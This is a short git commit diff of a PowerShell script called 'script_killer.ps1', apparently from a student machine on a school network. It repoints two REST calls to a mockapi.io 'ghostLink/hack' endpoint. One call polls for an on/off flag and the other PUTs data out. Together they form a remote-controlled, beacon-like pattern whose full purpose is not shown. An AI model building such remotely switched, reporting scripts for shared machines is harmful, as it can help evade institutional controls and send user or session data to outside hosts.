f9a78c2645d3b92b2e35612d4d07d0e33a1e6fa3
unknown <Student@SIOP0202-EDU-06.EPTM.lan>
2025-09-04 08:47:50 +0200

    new apis

--- powershell/script_killer.ps1
+++ powershell/script_killer.ps1
@@ -68,7 +68,7 @@ $global:lastNbLockSession = ""
 
 function checkDataBase {
     try {
-        $response = Invoke-RestMethod -Uri "https://68b82111b71540504327314e.mockapi.io/ghostLink" -Method Get -TimeoutSec 5
+        $response = Invoke-RestMethod -Uri "https://68b82111b71540504327314e.mockapi.io/ghostLink/hack" -Method Get -TimeoutSec 5
         Write-Host $response
         if ($response -ne $null) {
             $global:isActive = $response.isActive
@@ -214,7 +214,7 @@ function main {
                 }
 
                 try {
-                    $response = Invoke-RestMethod -Uri "https://68b82111b71540504327314e.mockapi.io/ghostLink/1" `
+                    $response = Invoke-RestMethod -Uri "https://68b82111b71540504327314e.mockapi.io/ghostLink/hack" `
                                             -Method Put `
                                             -Body $body `
                                             -Headers $headers
